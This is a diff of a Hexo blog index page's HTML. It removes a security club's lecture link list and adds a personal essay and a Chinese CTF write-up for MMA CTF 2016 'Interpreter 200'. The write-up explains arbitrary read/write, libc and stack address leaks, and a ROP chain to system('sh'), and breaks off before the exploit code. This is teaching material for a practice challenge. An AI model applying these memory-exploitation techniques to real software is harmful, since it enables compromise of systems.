-            <h1 id="106上學期社課"><a href="#106上學期社課" class="headerlink" title="106上學期社課"></a>106上學期社課</h1><h2 id="9-30-第一堂社課"><a href="#9-30-第一堂社課" class="headerlink" title="9&#x2F;30 第一堂社課"></a>9&#x2F;30 第一堂社課</h2><ul>
-<li><a target="_blank" rel="noopener" href="https://drive.google.com/file/d/0B2dY3bAMpyESRy1nVUsyZ0lvQzQ/view?usp=sharing">Linux_and_SA</a></li>
-<li><a target="_blank" rel="noopener" href="https://speakerdeck.com/bananaappletw/python">Python</a></li>
-</ul>
-<p><a target="_blank" rel="noopener" href="http://cdimage.kali.org/kali-2016.2/kali-linux-2016.2-amd64.iso">Kali iso</a></p>
-<p><a target="_blank" rel="noopener" href="http://releases.ubuntu.com/16.04.1/ubuntu-16.04.1-desktop-amd64.iso">Ubuntu iso</a></p>
-<h2 id="10-14-第二堂社課"><a href="#10-14-第二堂社課" class="headerlink" title="10&#x2F;14 第二堂社課"></a>10&#x2F;14 第二堂社課</h2><ul>
-<li><a target="_blank" rel="noopener" href="https://drive.google.com/file/d/0B2WSYFS3T0qOcDNHcl9oTksxZTg/view">Web Security</a></li>
-<li><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=wq9X2qIV-Xg">課程錄影</a></li>
-<li><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=HvhgTF_Upqk">課程錄影</a></li>
-</ul>
-<h2 id="10-28-第三堂社課"><a href="#10-28-第三堂社課" class="headerlink" title="10&#x2F;28 第三堂社課"></a>10&#x2F;28 第三堂社課</h2><ul>
-<li><a target="_blank" rel="noopener" href="https://speakerdeck.com/bananaappletw/some-tips">Some tips</a></li>
-<li><a target="_blank" rel="noopener" href="https://speakerdeck.com/bananaappletw/x86">x86</a></li>
-<li><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=32PvtalAC2A">課程錄影</a></li>
-<li><a target="_blank" rel="noopener" href="https://speakerdeck.com/bananaappletw/gdb">gdb</a></li>
-<li><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=50acU6jrpkg">課程錄影</a></li>
-</ul>
-<h2 id="11-18-第四堂社課"><a href="#11-18-第四堂社課" class="headerlink" title="11&#x2F;18 第四堂社課"></a>11&#x2F;18 第四堂社課</h2><ul>
-<li><a target="_blank" rel="noopener" href="https://speakerdeck.com/naetw/buffer-overflow">Buffer overflow</a></li>
-<li><a target="_blank" rel="noopener" href="http://people.cs.nctu.edu.tw/~chaoyy1202/Demo.tar.gz">Demo</a></li>
-<li><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=oPAh0fy3eAo">課程錄影</a></li>
-</ul>
-<h2 id="12-09-第五堂社課"><a href="#12-09-第五堂社課" class="headerlink" title="12&#x2F;09 第五堂社課"></a>12&#x2F;09 第五堂社課</h2><ul>
-<li><a target="_blank" rel="noopener" href="https://drive.google.com/file/d/0B7_xqQeTuoLpejJ0SFQ5b3dMbWs/view">ROP</a></li>
-<li><a target="_blank" rel="noopener" href="http://people.cs.nctu.edu.tw/~jyli8210/ROPDemo.tar.gz">Demo</a></li>
-<li><a target="_blank" rel="noopener" href="https://youtu.be/QYmWq2o7MtA">課程錄影</a></li>
-</ul>
-<hr>
-<h1 id="106-下學期社課"><a href="#106-下學期社課" class="headerlink" title="106 下學期社課"></a>106 下學期社課</h1><h2 id="03-03-第一堂社課"><a href="#03-03-第一堂社課" class="headerlink" title="03&#x2F;03 第一堂社課"></a>03&#x2F;03 第一堂社課</h2><ul>
-<li><a target="_blank" rel="noopener" href="https://drive.google.com/file/d/0B76OxXT0skp6NnZDbVB4UGYycUk/view">Format String</a></li>
-<li><a target="_blank" rel="noopener" href="http://people.cs.nctu.edu.tw/~jyli8210/FMTdemo.tar.gz">Demo</a></li>
-<li><a target="_blank" rel="noopener" href="https://youtu.be/FvGhDlK36PI">課程錄影 part1</a> &#x2F; <a target="_blank" rel="noopener" href="https://youtu.be/oiicCDA4RNc">part2</a> &#x2F; <a target="_blank" rel="noopener" href="https://youtu.be/o3KXSayMvhw">part3</a></li>
-</ul>
-<h2 id="03-17-第二堂社課"><a href="#03-17-第二堂社課" class="headerlink" title="03&#x2F;17 第二堂社課"></a>03&#x2F;17 第二堂社課</h2><ul>
-<li><a target="_blank" rel="noopener" href="http://secprog.cs.nctu.edu.tw/problems/12">題目1</a></li>
-<li><a target="_blank" rel="noopener" href="http://secprog.cs.nctu.edu.tw/problems/13">題目2</a></li>
-<li><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=VXbYyYYcvdU">課程錄影</a></li>
-</ul>
-<h2 id="04-18-第三堂社課"><a href="#04-18-第三堂社課" class="headerlink" title="04&#x2F;18 第三堂社課"></a>04&#x2F;18 第三堂社課</h2><ul>
-<li><a target="_blank" rel="noopener" href="https://drive.google.com/file/d/0B2WSYFS3T0qOUjRSdDRZUEdBbU0/view?usp=sharing">Crypto 講義</a></li>
-<li><a target="_blank" rel="noopener" href="https://drive.google.com/file/d/0B2WSYFS3T0qOc0Q2YTdad3lTMms/view?usp=sharing">題目與工具</a></li>
-<li><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=kURuAjqFv9k">課程錄影 part1</a> &#x2F; <a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=qyjaqF6p4hw">part2</a> &#x2F; <a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=dkinSlwM5u8">part3</a></li>
-</ul>
-<h2 id="04-28-第四堂社課"><a href="#04-28-第四堂社課" class="headerlink" title="04&#x2F;28 第四堂社課"></a>04&#x2F;28 第四堂社課</h2><ul>
-<li><a target="_blank" rel="noopener" href="https://drive.google.com/file/d/0B2WSYFS3T0qOZ04xekRnZDRUZmc/view">Length Extension Attack</a></li>
-</ul>
-<h2 id="05-05-第五堂社課"><a href="#05-05-第五堂社課" class="headerlink" title="05&#x2F;05 第五堂社課"></a>05&#x2F;05 第五堂社課</h2><ul>
-<li><a target="_blank" rel="noopener" href="https://hackmd.io/p/BkKNiQzee#/">Web Security Basic</a></li>
-<li><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=jENhKE2yTOU&feature=youtu.be">課程錄影</a></li>
-</ul>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2016/09/26/2016/browser-compatibility-of-string-prototype-endswith/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -3821,11 +2983,758 @@ cat: ._flag: No such file or directory
 
 
     
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2016/09/10/%E4%B8%80%E8%A7%81%E9%92%9F%E6%83%85%EF%BC%8C%E6%97%A0%E7%96%BE%E8%80%8C%E7%BB%88/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="逐流小站">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2016/09/10/%E4%B8%80%E8%A7%81%E9%92%9F%E6%83%85%EF%BC%8C%E6%97%A0%E7%96%BE%E8%80%8C%E7%BB%88/" itemprop="url">一见钟情，无疾而终</a></h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-09-10T19:29:57+08:00">
+                2016-09-10
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%94%9F%E6%B4%BB%E6%84%9F%E6%82%9F/" itemprop="url" rel="index">
+                    <span itemprop="name">生活感悟</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
+     crossorigin="anonymous"></script>
+<ins class="adsbygoogle"
+     style="display:block; text-align:center;"
+     data-ad-layout="in-article"
+     data-ad-format="fluid"
+     data-ad-client="ca-pub-4522670236044605"
+     data-ad-slot="5167312561"></ins>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+      
+      
+
+      
+        
+          昨天晚上，不知道为什么突然特别难过，或许是因为被同事说中心事，或许是因为想到我喜欢过的女孩而心存不甘，或许是因为憎恶现在这个状态的自己......总而言之，有那么一瞬间我感到我的心像是被挖去了一块，原来喜欢一个人可以让我如此难过，想到种种过往我以为自己会泣不成声，结果我声音哽咽着眼睛却是干的，或许我们最喜欢使用的那个“破涕为笑”的表情最能形容我当时的心境，我想了很久，一个人跑出去散步，当风轻轻地划过我的脸庞的时候，当秋天的寒意让我猝不及防的时候，我忽然觉得，当这个世界越发地充满“恶意”的时候，你更需要一个坚强地理由去生活，她们都教会我很多，和这个相比，悲伤和痛苦都显得微不足道，我想努力学好英语、我想努力练习写字、我想努力培养兴趣、我想努力克服恐惧，我是一个骄傲的人，在技术上是在生活上更应该是，如果我不能像编程一样掌控世界，我愿意在这纷繁的世界里不忘初心，喜欢和爱这种美好的情感，是不该让悲伤来消化的奢侈品;男人在年轻的时候，最难以接受而不得不接受的一个现实是，你非常喜欢一个人，可你此时此刻完全没有能力给她想要的生活，就像古古说她可能再遇不到我这样对她好的人，可她始终觉得我们两个人是没有未来的，而这一次，我忽然发现这一切是如此的相似，虽然我清楚地知道她们是完全不同的两个人，当她们同时对我说出“你会找到真正适合你的那个人”这句话的时候，我已无心分辨这句话的真假，我只知道我会陷入无休止的纠结，就像一个死循环导致的精神分裂;当一个男生接受女生“成为朋友”这种现实的时候，从某种意义上来讲，他是将对她的喜欢以一种新的方式重新输出，就像她不在公司里的时候，她愿意委托我帮她处理某些事情，这对我而言是非常开心的一个时刻，因为你永远都期待着，她在有事情的时候能够第一个想到你，即使她曾经拒绝过你两次，即使她明确告诉你她不喜欢你，我曾经告诉过自己，喜欢是占有而爱是克制，至少曾经有很多很多的瞬间，我们两个人因为坦露心声而变得非常开心，这是我最让我怀念的瞬间
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2016/09/10/%E4%B8%80%E8%A7%81%E9%92%9F%E6%83%85%EF%BC%8C%E6%97%A0%E7%96%BE%E8%80%8C%E7%BB%88/">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2016/09/07/MMA-CTF-2nd-2016-Interpreter-200/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="逐流小站">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2016/09/07/MMA-CTF-2nd-2016-Interpreter-200/" itemprop="url">[MMA CTF 2nd 2016] Interpreter 200</a></h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-09-07T18:04:00+08:00">
+                2016-09-07
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/write-ups/" itemprop="url" rel="index">
+                    <span itemprop="name">write-ups</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
+     crossorigin="anonymous"></script>
+<ins class="adsbygoogle"
+     style="display:block; text-align:center;"
+     data-ad-layout="in-article"
+     data-ad-format="fluid"
+     data-ad-client="ca-pub-4522670236044605"
+     data-ad-slot="5167312561"></ins>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+      
+      
+
+      
+        
+        
+          
+            <h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><blockquote>
+<p>Category: pwn<br>Point: 200<br>Solver: bruce30262 @ BambooFox</p>
+</blockquote>
+<h2 id="Analyzing"><a href="#Analyzing" class="headerlink" title="Analyzing"></a>Analyzing</h2><p>首先透過 <code>file</code> 指令以及 <a target="_blank" rel="noopener" href="http://www.trapkit.de/tools/checksec.html">checksec.sh</a> 的幫助，我們可以知道這是一個 x86_64 的 ELF，保護全開:  </p>
+<pre>
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   ./befunge_patch  
+</pre>
+
+<p>之後透過將程式丟入 IDA Pro 做靜態分析，以及試著執行程式，對程式行為進行簡單的動態分析之後，我們可以得知:  </p>
+<ul>
+<li>這是一隻 <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Befunge">Befunge-93</a> 程式的 Interpreter。程式一開始會要求我們輸入一個 Befunge-93 程式，之後會試著解譯並執行我們的程式。  </li>
+<li>一隻 Befunge-93 程式由一連串的 <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Befunge#Befunge-93_instruction_list">Befunge-93 指令</a> 所組成。我們可以輸入很多行的 Befunge-93 指令(一行最多80個字元，最多25行)。  </li>
+<li>程式之後會一個字元一個字元的解譯並執行我們的Befunge-93 指令，最多執行到第 10000 個指令</li>
+</ul>
+<p>整理成 pseudo code 之後大概是這種感覺:  </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 不重要的部分將以註解代替</span></span><br><span class="line"><span class="comment">// 實際程式有做哪些事情可以自行利用 IDA Pro 進行分析</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Welcome to Online Befunge(93) Interpreter&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Please input your program.&quot;</span>);</span><br><span class="line">	program = read_program(); <span class="comment">// read user input to buffer &#x27;program&#x27;</span></span><br><span class="line">	</span><br><span class="line">	step = <span class="number">10001</span>;</span><br><span class="line">	row = <span class="number">0</span>, col = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">do</span></span><br><span class="line">	&#123;</span><br><span class="line">		ins = program[<span class="number">80</span> * row + col]</span><br><span class="line">		<span class="keyword">switch</span> ( ins )</span><br><span class="line">		&#123;</span><br><span class="line">			.....<span class="comment">//other instruction...</span></span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;&amp;&#x27;</span>: <span class="comment">// ask user for a number and push it to stack</span></span><br><span class="line">				__isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;x);</span><br><span class="line">				push(x);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;.&#x27;</span>: <span class="comment">// Pop value and output as an integer followed by a space</span></span><br><span class="line">				x = pop();</span><br><span class="line">				__printf_chk(<span class="number">1LL</span>, <span class="string">&quot;%d &quot;</span>, x);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			.....<span class="comment">//other instruction...</span></span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;*&#x27;</span>:  <span class="comment">// pop x, y, push x*y</span></span><br><span class="line">				a = pop();</span><br><span class="line">				b = pop();</span><br><span class="line">				push(a * b);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			.....<span class="comment">//other instruction...</span></span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;g&#x27;</span>: <span class="comment">// (get) Pop x and y, then push ASCII value of the character at that position in the program</span></span><br><span class="line">				x = pop();</span><br><span class="line">				y = pop();</span><br><span class="line">				push( (<span class="type">char</span>)(program[<span class="number">80</span> * x + y]) );</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;p&#x27;</span>: <span class="comment">// (put) Pop x, y, and z, then change the character at (x,y) in the program to the character with ASCII value z</span></span><br><span class="line">				x = pop();</span><br><span class="line">				y = pop();</span><br><span class="line">				z = pop();</span><br><span class="line">				program[<span class="number">80</span> * x + y] = (<span class="type">char</span>)z;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27; &#x27;</span>: <span class="comment">// space = do nothing</span></span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		--step;</span><br><span class="line">		<span class="comment">// update row &amp; column</span></span><br><span class="line">		<span class="comment">// do other stuff...</span></span><br><span class="line">	&#125;<span class="keyword">while</span> ( step );</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Too many steps. Is there any infinite loops?&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>pseudo code 將一些比較重要的功能都列在上面了。  </p>
+<p>透過觀察程式的行為，我們不難發現:  </p>
+<ul>
+<li>利用 <code>&amp;</code>, <code>g</code> 和 <code>.</code> 的功能，我們有辦法做到<strong>任意讀</strong>。<ul>
+<li>先透過 <code>&amp;</code> 將 <code>x</code> 跟 <code>y</code> push 到 Stack 上<ul>
+<li><code>x</code> 與 <code>y</code> 我們可控(32 bit integer)</li>
+<li>這邊注意 Stack (大寫S) 是程式在 bss 段自行模擬出來的一塊，擁有類似 stack 行為的記憶體區塊，並不是指程式真正的 stack。</li>
+</ul>
+</li>
+<li><code>g</code> 的功能是將 <code>program[80 * x + y]</code> 的內容 push 至 Stack 上。因為<code>x</code> 與 <code>y</code> 我們可控，代表著我們可以將任意位址的內容 push 到 Stack 上。</li>
+<li><code>.</code> 會將 Stack 頂端的值(可控) pop 出來 (1 byte)，並印出他的數值。</li>
+</ul>
+</li>
+<li>利用 <code>&amp;</code> 和 <code>p</code> 的功能，我們還有辦法做到<strong>任意寫</strong><ul>
+<li>先透過 <code>&amp;</code> 將 <code>x</code>, <code>y</code>與 <code>z</code> push 到 Stack 上</li>
+<li><code>p</code> 功能會先從 Stack pop 出 3 個值 (<code>x</code>, <code>y</code>, <code>z</code>，均可控)，之後將 z 的值放入 <code>program[80 * x + y]</code> (即<code>program[80 * x + y] = z</code>)。</li>
+</ul>
+</li>
+<li>還有一點要注意  <ul>
+<li>因為透過 <code>&amp;</code> 功能將數值 push 進 Stack 時，一次只能 push 一個 integer (32 bit)。如果我們想要使 <code>program[80 * x + y]</code> 跳到很遠的地方，<code>x</code> 與 <code>y</code> 很有可能會需要是一個超過 integer 範圍的數值，如此一來使用 <code>&amp;</code>功能將無法滿足我們的需求。</li>
+<li>解決方法，是利用 <code>*</code> 功能。<code>*</code> 會從 Stack 頂端 pop 出兩個數值 <code>x</code>與<code>y</code>，並將 <code>x * y</code> 的結果 push 回 Stack 上。這裡全程是使用 64 bit register 進行操作，所以不會有 integer 32 bit 的問題。</li>
+<li>因此，先透過<code>*</code>功能將 Stack 頂端變成一個 long integer，之後我們就可以利用上面的方法<strong>對任意位址做任意讀寫。</strong></li>
+</ul>
+</li>
+</ul>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>現在我們知道洞在哪了，也知道該怎麼利用這個漏洞進行任意位址的讀寫操作。因為這題有DEP無法執行 shellcode，因此首要的任務是要去 leak libc 的 address，我們才有辦法知道 <code>system</code> 的位址，進而執行 <code>system(&#39;sh&#39;)</code> 拿 shell。  </p>
+<p>而要 leak libc 的 address 其實不難。這題雖然 GOT 不能寫，但還是可以讀，因此我們可以透過任意讀的漏洞來 leak GOT，獲得 libc 的 address。這裡我是去 leak <code>__libc_start_main</code> 的 GOT，並透過 <a target="_blank" rel="noopener" href="https://github.com/niklasb/libc-database">libc-database</a> 來獲取遠端 libc 的版本以及相關的 offset。  </p>
+<p>現在我們有了 libc 的 address，該跳 system 了。問題是該怎麼跳呢?這題沒有 function pointer， GOT 與 fini array 都是唯讀，我們無法透過 overwrite function pointer 或是 GOT hijacking 的方式來 exploit。<strong>唯一的辦法，就是去 overwrite return address</strong>。  </p>
+<p>問題來了: 要 overwrite return address，首先我們必須知道 stack 的位址，因此我們必須要有辦法先 leak stack address。而要 leak stack address，有以下幾種方式:  </p>
+<ul>
+<li><strong>leak stack 上的 saved rbp 或是 argv</strong>。這部份通常是用在 format string 的漏洞，這題無法這樣做。  </li>
+<li><strong>leak tls section 上的 stack address</strong>。這部份比較進階，簡單來說就是程式在執行的時候，會有個 memory 的區塊叫做 tls section，裡面會存許多有用的東西，像是 stack canary, main_arena 的 address, 以及一個不知道指向哪裡的 stack address。而要透過這種方式 leak stack address，我們必須要有辦法知道 tls section 的位址，而這通常需要透過程式先呼叫 mmap，之後 leak mmap 出來的 memory address 來達成。這題因為沒有 malloc 或是 mmap，所以也無法透過這樣的方式來 leak stack address。  </li>
+<li><strong>leak ld-linux.so 的 __libc_stack_end symbol</strong>。如果我們有辦法知道 ld-linux.so 的位址以及版本，我們可以透過 leak 裡面的 <code>__libc_stack_end</code> 這個 symbol，來獲取 stack address。這題用這種方式理論上辦的到，我自己就是用這種方式 leak 的，只是做起來非常麻煩。解完這題之後，經詢問別人才發現原來還有第四種方式。  </li>
+<li><strong>leak libc 裡面的 environ symbol</strong>。經過 pwn queen meh 的提點，才知道原來 libc 裡面有個 symbol 叫做 <code>environ</code>，裡面會存 stack address。因此這題比較漂亮的方式，是 leak libc 的 address 之後，直接 leak <code>libc.symbols[&#39;environ&#39;]</code> 來獲取 stack address。</li>
+</ul>
+<p>不過當時的我還是採取了第三種，也就是先 leak ld-linux.so，再 leak <code>__libc_stack_end</code> 的方式來獲取 stack address。ld-linux.so 的版本是直接用 libc 版本去猜。至於 leak ld-linux.so 的位址有幾種方式:  </p>
+<ul>
+<li>leak <code>dl_resolve</code> 的GOT。<code>dl_resolve</code> 位於 <code>ld-linux.so</code> 裡面，而它的 GOT 通常位於 GOT[2] ( 第三個 GOT entry ) 這個位置，因此如果有辦法 leak <code>dl_resolve</code> 的 GOT， 可以直接獲得 ld-linux.so 的位址。但是這題因為是 FULL RELRO 的關係，因此 GOT[2] 的位址是空的 ( 因為function 已經 bind 好了不需要做 runtime resolve )， 無法利用這樣的方式來 leak。</li>
+<li>leak DT_DEBUG 的 info。這部份請參考<a target="_blank" rel="noopener" href="http://rk700.github.io/article/2015/04/09/dt_debug-read">這個連結</a>。簡而言之，這題用這種方式是可行的 ( 有辦法 leak 到 ld-linux.so )。</li>
+</ul>
+<p>因此總結這題的 exploit 方法:  </p>
+<ul>
+<li>先透過任意讀的漏洞 leak libc 的 address</li>
+<li>(錯誤解法) 透過任意讀的漏洞 leak ld-linux.so 的 address，再 leak <code>__libc_stack_end</code> 來獲得 stack address  </li>
+<li>(正確解法) 直接 leak libc 的 <code>environ</code> symbol 來獲取 stack address</li>
+<li>透過任意寫的漏洞，overwrite return address<ul>
+<li>可透過 pop_rdi –&gt; bin_sh 字串 –&gt; system 的方式做 ROP 來拿 shell</li>
+</ul>
+</li>
+</ul>
+<p>final exploit ( leak ld-linux.so的版本 ) :</p>
+<figure class="highlight python"><figcaption><span>exp_bef.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span 